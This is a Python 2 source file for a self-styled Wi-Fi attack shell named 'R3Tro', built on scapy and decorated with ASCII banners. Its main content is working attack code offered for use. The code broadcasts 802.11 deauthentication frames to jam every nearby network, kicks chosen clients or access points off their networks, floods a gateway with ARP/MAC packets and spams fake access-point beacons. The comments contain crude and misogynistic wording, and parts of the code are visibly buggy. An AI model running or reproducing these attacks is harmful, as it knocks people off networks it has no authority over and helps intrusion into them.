# coding=utf-8
# !/usr/bin/python
##################################################################################
# lmao
import threading
import subprocess
import queue

q = queue.Queue()

import os
from scapy.all import *
from colors import *
import time
import sys

##################################################################################
# BANNERS
# sick AF

intro_banner = '''
              ________
          _,.-Y  |  |  Y-._
      .-~"   ||  |  |  |   "-.
      I" ""=="|" !""! "|"[]""|     _____
      L__  [] |..------|:   _[----I" .-{"-.
     I___|  ..| l______|l_ [__L]_[I_/r(=}=-P 
    [L______L_[________]______j~  '-=c_]/=-^
     \_I_j.--.\==I|I==_/.--L_]
       [_((==)[`-----"](==)j
          I--I"~~"""~~"I--I
          |[]|         |[]|
          l__j         l__j
          |!!|         |!!|
          |..|         |..|
          ([])         ([])
          ]--[         ]--[
          [_L]         [_L]  -R3Tro
         /|..|\       /|..|
        `=}--{='     `=}--{='
       .-^--r-^-.   .-^--r-^-.
'''

canon_lunch = '''

     |'-.--._ _________:
     |  /    |  __    __/
     | |  _  | [\_\= [\_/
     | |.' '. \.........|
     | ( <)  ||:       :|_
      \ '._.' | :.....: |_(ooo-o-o-o-o-o ~~#LuNcHiNg ThE cAnNoN
       '-\_   \ .------./
       _   \   ||.---.||  _
      / \  '-._|//n~~/n' | /
     (| []=.--[===[()]===[) |
     <\_/  \_______/ _.' /_/
     ///            (_/_/
     |\\            [\\
     ||:|           | I|
     |::|           | I|
     ||:|           | I| 
     |\:|            \I|
     :/\:            ([])
     ([])             [|
      ||              |\_
     _/_\_            [ -'-.__
    <]   \>            \_____.>
      \__/
'''

releasing_corc = """
                      _ ___ 
       _ _         _@)@) \          /^^\ /^\ /^^\_ 
    _/oo \____/~''. . .  '~\       /'/''  ~ ''~~' -'\_ 
   / '.'. ~.~.~.       .'    ~ |     /'\~~..''''.'' ''  ~\_ 
  ('_'_'_'_'_'_'_'_  ' :   '     \_/' '.''  . '.   .''  '.  ~\_ 
  ~V~V~V~V  \   ~\  '' '~  '   '' ~   `   ~  ''   ~\_ 
    /\~/\~/\~/\~/|/  '   ''  _   ' ~ ''  '    ~  '' __  '  ..  \_ 
    \ <-- --- ---.---.--/'   ''   /'  '\_ '' ': ~ ;;''    ' /''; \ ;'''''' '' ~\ _ 
    \~ '. . : .:: ~. :.  /_'''_'' \_' :'''_ : _ ''/''_' '_ \:_ '''' ''..\/\/\/~/\~ 
      ~~ \-~ `---~~~---- \(_)(_)(_)/ ~ ~~' ~\(_)(_)(_)\_~_~_~_~_~/˜¤
"""

#################################################################################################################################

# LISTS i dont know why i added them to the script nvm
ap_list = []
clients_list = []
ssid_list = []


##################################################################################
# this is where all the shit begins

class wifi():
    def __init__(self, iface):
        self.iface = iface

    ##################################################################################
    # check for wifi's in your area
    def check_area(self):
        try:
            print '[*] Scannig the area for access points\n'
            raw_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 3)
            raw_socket.bind((self.iface, 0x0003))
            sniff_scapy = sniff(iface=self.iface, count=1)

            while True:
                packet = raw_socket.recvfrom(6000)
                sniffed = packet[0]
                for sn_scapy in sniff_scapy:
                    if sn_scapy.haslayer(Dot11):
                        for sn_scapy in sniff_scapy:
                            try:
                                enc_type = sn_scapy[Dot11Elt:13].info
                                if (enc_type.startswith('\x00\xf2')):
                                    enc_type = 'WEP'
                                else:
                                    enc_type = 'WPA/WPA2'
                            except:
                                if '4356' in str(sn_scapy.cap):
                                    enc_type = 'WEP'
                                else:
                                    enc_type = 'OPEN'

                #                s = str(sniffed[36:42].encode('hex')).upper()
                #                mac = s[0] + s[1] + ':' + s[2] + s[3] + ':' + s[4] + s[5] + ':' + s[6] + s[7] + ':' + s[8] + s[9] + \
                #                      ':' + s[10] + s[11]
                if sniffed[26] == '\x80' and sn_scapy.addr2 not in ap_list:
                    ap_list.append(sn_scapy.addr2)
                    a = ord(sniffed[63])
                    ssid = sniffed[64:64 + a]
                    ch = ord(sniffed[64 + a + 12])
                    ssid_list.append(ssid)
                    print 'SSID ---> {} --- BSSID ---> {} --- CH ---> {} --- ENCTYPE ---> {}'.format(ssid,
                                                                                                     str(
                                                                                                         sn_scapy.addr2).upper(),
                                                                                                     ch,
                                                                                                     enc_type)
        except Exception, e:
            if 'No such device' in e:
                print '[-] the adapter has been disconnected or removed'
            else:
                print e
            exit(0)

    ##################################################################################
    # find client on a specific access point
    def find_client_on_ap(self, ssid):
        self.ssid = ssid
        print '[=====SCANNING=====]'
        while True:
            fm = sniff(iface=self.iface, count=1)

            for packs in fm:
                if packs.haslayer(Dot11ProbeReq):
                    if packs.getlayer(Dot11ProbeReq).info == self.ssid:
                        print '[+] {}'.format(packs.getlayer(Dot11ProbeReq).addr2)


    ##########################################################################################
    # when you want to be the one in control B)
    # TIP: if it didnt capture any packets
    # TODO: unplug the adapter then plug it back and start monitor mode again
    def sniff_area(self):
        try:
            print '[*] Releasing the croc for packets'
            time.sleep(2)
            i = 1
            print fg.orange + releasing_corc
            print fg.pink + '[*] listening for packets'
            time.sleep(1.5)
            try:
                while True:
                    sniffed = sniff(iface=self.iface, count=1)
                    for pack in sniffed:
                        if pack.haslayer(TCP):
                            print bcolors.OKGREEN + '[+] Detected TCP packets ' + fg.pink, str(
                                pack.getlayer(TCP).info), ' | ', str(pack.getlayer(TCP).addr2)

                        elif pack.haslayer(DNS):
                            print bcolors.OKBLUE + '[+] Detected DNS packets ' + bcolors.OKGREEN, str(
                                pack.getlayer(DNS).info), ' | ', \
                                str(pack.getlayer(DNS).addr2)

                        elif pack.haslayer(Dot11Beacon):
                            print fg.lightred + '[+] Detected 802.11 Beacon' + fg.orange, str(
                                pack.getlayer(Dot11Beacon).info), ' | ', str(pack.getlayer(Dot11Beacon).addr2)

                        elif pack.haslayer(Dot11ProbeReq):
                            print fg.lightcyan + '[+] Detected Probe Request'
                            if pack.info == None or len(str(pack.getlayer(Dot11ProbeReq).info)) == 0:
                                print fg.cyan + 'CLIENT ---> ', str(pack.getlayer(Dot11ProbeReq.addr2))
                            else:
                                print 'SSID ---> ', str(pack.getlayer(Dot11ProbeReq).info), ' --- CLIENT ---> ', str(
                                    pack.getlayer(Dot11ProbeReq).addr2)
                        elif pack.haslayer(Dot11):
                            print fg.yellow + '[+] Detected 802.11 Packets'
                            if pack.type == 0 and pack.subtype == 12:
                                print fg.red + bg.black + '[*] Deauth Detected '
                                i = i + 1
            except Exception,e:
                print '[-] ERROR: ',e
                pass

        except Exception, e:
            print e



    ##########################################################################################
    # when you are a star wars fan and you love Darkside
    def jam_area(self):
        SSi = []
        print canon_lunch
        print '[*] Jammer Deployed'

        while True:
            sniffed = sniff(iface=self.iface, count=1)
            for pack in sniffed:
                if pack.haslayer(Dot11):
                    fullname = 'ssid ---> ' + str(pack.getlayer(Dot11).info) + ' --- mac --->' + str(
                        pack.getlayer(Dot11).addr2)
                    if pack.addr2 not in SSi:
                        print fullname
                        SSi.append(pack.addr2)
            for jam_network in SSi:
                print '[*] Jaming {}'.format(jam_network)
                jammer = RadioTap() / Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=jam_network,
                                            addr3=jam_network) / Dot11Deauth()
                sendp(jammer, iface=self.iface, count=1, inter=.01, verbose=False)

    #################################################################################
    # kicking them isnt better?
    def manual_client_jammer(self, ap, client, numOFpack):
        while True:
            for pack in sniff(iface=self.iface, count=1):
                if pack.haslayer(Dot11ProbeReq):
                    ap1 = pack.getlayer(Dot11).addr2
                    ssid = pack.getlayer(Dot11).info
                    if ap1 == ap:
                        client1 = pack.getlayer(Dot11ProbeReq).addr2
                        if client1 == client:
                            frame = RadioTap() / Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()
                            sendp(frame, verbose=False, iface=self.iface, inter=.1, count=numOFpack)

    ##################################################################################
    # just kick them all
    def manual_ap_jammer(self, ap):
        num = raw_input('number of packets to rape the access point:')
        while True:
            sniffed = sniff(iface=self.iface, count=1)
            for pck in sniffed:
                if pck.haslayer(Dot11):
                    if pck.getlayer(Dot11).addr2 == ap or pck.getlayer(Dot11).info == ap:
                        print '[!] Jamming {} | {}'.format(pck.info, pck.addr2)
                        ap1 = pck.getlayer(Dot11).addr2
                        break
        print '[*] starting...\n'
        frame = RadioTap() / Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=ap1, addr3=ap1) / Dot11Deauth()
        sendp(frame, verbose=False, iface=self.iface, inter=.1, count=num)
        print '[+] Done'

    ##################################################################################
    # idk what to name it
    def get_dev_info(self):
        print 'listening for packets'
        while True:
            sniffed = sniff(iface=self.iface, count=1)
            for pck in sniffed:
                if pck.haslayer(IP):
                    print pck.src, ' - ', pck.info, ' - ', pck.addr2

    ##################################################################################

    def distract_hoes(self):

        names = ['dugi', 'fugi', 'Dinasour', 'shugi']

        def spam_area(name):
            bc = bcolors

            mac = RandMAC()
            print bc.OKBLUE + '[+] Setting up a fake access point\n' + bc.END
            head = Dot11(subtype=8, type=0, addr1='ff:ff:ff:ff:ff:ff', addr2=mac, addr3=mac)
            info = Dot11Beacon(cap='ESS')
            share_it = Dot11Elt(ID='SSID', info=name, len=len(str(name)))
            all_ = RadioTap() / head / info / share_it
            print bc.OKGREEN + bc.UNDERLINE + '[+] {} started\n'.format(name), bc.END
            sendp(all_, verbose=False, iface='wlan0mon', loop=1)

        def create_worker():
            for threads in range(len(names) + 1):
                t = threading.Thread(target=work, args=())
                t.daemon = True
                t.start()

        dont_rep = []

        def work():
            workers = q.get()
            for i in range(workers):
                for rand_name in names:
                    if rand_name not in dont_rep:
                        dont_rep.append(rand_name)
                        spam_area(str(rand_name))

            q.task_done()

        def create_jobs():
            for nums in range(len(names)):
                q.put(nums)
            q.join()

        q = queue.Queue()
        create_worker()
        create_jobs()


#################################################################################
def start_mon_mode(ifac):
    print '[*] starting monitor mode \n'
    time.sleep(1)
    subprocess.call(
        'ifconfig ' + ifac + ' down ; iw ' + ifac + ' interface add daddywifi type monitor ; ifconfig ' + ifac + ' up ; ifconfig daddywifi up ; service network-manager restart',
        shell=True)

    try:
        subprocess.call('ifconfig daddywifi', shell=True)
        print '\n[+] DONE\n'
    except:
        print '[-] No Such a Device'


##################################################################################
def mac_flood(gateway_ip, iface):
    eth_pkt = Ether(src=RandMAC(), dst='ff:ff:ff:ff:ff:ff')
    arp_pkt = ARP(pdst=gateway_ip, hdwdst='ff:ff:ff:ff:ff:ff')
    try:
        sendp(eth_pkt / arp_pkt, iface=iface, count=2000, inter=.001)
    except:
        print '\nDestination is unreachable'


##################################################################################

def begforhelp():
    c = themes.Color
    print bcolors.OKGREEN + '_' * 50
    print c.red + '[1] ' + c.green + 'check area for access points'
    print c.blue + '[2] ' + c.yellow + 'check area for every packet'
    print c.green + '[3] ' + c.blue + 'start monitor mode'
    print c.cyan + '[4] ' + c.red + 'jam networks in the area'
    print bcolors.WARNING + '[5] ' + fg.pink + 'find clients of an access point'
    print bcolors.OKBLUE + '[6] ' + fg.yellow + 'jam an access point'
    print fg.orange + '[7] ' + fg.lightred + 'deauthenticate a client of a access point'
    print fg.lightred + '[8] ' + c.blue + 'mac flood a router'
    print fg.pink + '[9] ' + c.yellow + 'errors section'
    print c.red + '[10] ' + c.cyan + 'generate a fake access point'
    print c.yellow + '[11] ' + c.green + 'spam the area with fake access points'
    print bcolors.OKGREEN + '_' * 50


##################################################################################

def errorsec():
    print bcolors.OKGREEN + '_' * 50
    print bcolors.OKBLUE + '1- if the it didnt capture any packets unplug the adapter then plug it back in\n' \
                           '2- if you want to do a quick test to the packet sniffer just turn on your wifi do some ' \
                           'refresh with your phone\n' \
                           '3- if you found a bug DM me on IG:h3ma__'
    print bcolors.OKGREEN + '_' * 50


##################################################################################
# Main starts here
def main():
    while True:
        try:
            choice = raw_input(os.getlogin() + '@' + os.uname()[1] + ':>>')
            ##########################################################
            if choice.lower() == 'help':
                begforhelp()
            ##########################################################
            elif choice.lower() == 'quit':
                exit(0)
            ##########################################################
            elif choice.lower() == 'clear':
                os.system('clear')
                main()
            ##########################################################
            elif choice == '1':
                try:
                    inface = raw_input('interface:?>')
                    if inface != 'daddywifi':
                        print '[*] starting monitor mode..!'
                        y_n = raw_input('[Y/N]>> ')
                        if y_n.lower() == 'n':
                            main()
                        if y_n.lower() == 'y':
                            inface = raw_input('interface to start mon mode on: ')
                            start_mon_mode(inface)
                            wifi('daddywifi').check_area()
                    else:
                        wifi('daddywifi').check_area()
                except KeyboardInterrupt:
                    main()
            ##########################################################
            elif choice == '2':
                try:
                    inface = raw_input('interface:?>')
                    if inface != 'daddywifi':
                        print '[*] starting monitor mode..!'
                        y_n = raw_input('[Y/N]>> ')
                        if y_n.lower() == 'n':
                            main()
                        if y_n.lower() == 'y':
                            inface = raw_input('interface:?>')
                            start_mon_mode(inface)
                            wifi('daddywifi').sniff_area()
                    else:
                        wifi('daddywifi').sniff_area()
                except KeyboardInterrupt:
                    main()
            ##########################################################
            elif choice == '3':
                inface = raw_input('interface to start mon mode on: ')
                start_mon_mode(inface)
                print '[+] DONE'
                main()
            ##########################################################
            elif choice == '4':
                try:
                    inface = raw_input('interface:?>')
                    if inface != 'daddywifi':
                        print '[*] starting monitor mode..!'
                        y_n = raw_input('[Y/N]>> ')
                        if y_n.lower() == 'n':
                            main()
                        if y_n.lower() == 'y':
                            inface = raw_input('interface:?>')
                            start_mon_mode(inface)
                            wifi('daddywifi').jam_area()
                    else:
                        wifi('daddywifi').jam_area()
                except KeyboardInterrupt:
                    main()
            ##########################################################
            elif choice == '5':
                iface = raw_input('interface:>')
                ssid = raw_input('[=] SSID to find clients on:>')
                wifi(iface).find_client_on_ap(ssid)

            ##########################################################
            elif choice == '9':
                errorsec()

            else:
                print bcolors.FAIL, 'wrong command ' + choice + bcolors.OKGREEN

            ##########################################################
        except KeyboardInterrupt:
            print '[-] Exiting'
            exit(0)
        ##########################################################


##################################################################################

# TODO nothing just enjoy
if __name__ == '__main__':
    for hoes in range(1):
        c = themes.Color
        print fg.red + '██████╗ ██████╗ ████████╗██████╗  ██████╗ '
        print fg.blue + '██╔══██╗╚════██╗╚══██╔══╝██╔══██╗██╔═══██╗'
        print fg.yellow + '██████╔╝ █████╔╝   ██║   ██████╔╝██║   ██║' + bcolors.OKBLUE + ' =++++R3Tro mode is on'
        print fg.orange + '██╔══██╗ ╚═══██╗   ██║   ██╔══██╗██║   ██║'
        print fg.cyan + '██║  ██║██████╔╝   ██║   ██║  ██║╚██████╔╝'
        print fg.pink + '╚═╝  ╚═╝╚═════╝    ╚═╝   ╚═╝  ╚═╝ ╚═════╝ '
        print bcolors.OKGREEN + 'WELCOME TO R3TROs SHELL TYPE HELP TO SEE OPTIONS'
        t = threading.Thread(target=wifi('wlan0mon').sniff_area())
        t.daemon = True
        t.start()

